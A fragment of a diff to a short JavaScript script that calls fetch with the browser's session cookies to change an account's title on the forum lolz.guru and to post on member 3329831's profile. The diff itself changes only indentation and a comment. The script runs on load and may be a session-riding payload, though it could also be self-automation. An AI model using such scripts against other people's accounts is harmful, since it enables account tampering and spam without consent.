@@ -12,10 +12,10 @@ async function f() {
 	// change title
 	fetch("https://lolz.guru/account/personal-details-save", {
 		"headers": {
-    		"accept": "application/json, text/javascript, */*; q=0.01",
-    		"accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
-    		"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-    		"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"92\"",
+    			"accept": "application/json, text/javascript, */*; q=0.01",
+    			"accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
+    			"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+    			"sec-ch-ua": "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"92\"",
  			"sec-ch-ua-mobile": "?0",
   			"sec-fetch-dest": "empty",
  			"sec-fetch-mode": "cors",
@@ -31,7 +31,7 @@ async function f() {
 		"credentials": "include"
 	});
 
-	// create post
+	// create profile post
 	fetch("https://lolz.guru/members/3329831/post", {
 		"headers": {
 			"accept": "application/json, text/javascript, */*; q=0.01",
@@ -55,7 +55,6 @@ async function f() {
 	return 0;
 }
 f();
-
 
 /*
 блин там додик какой та в чате срет
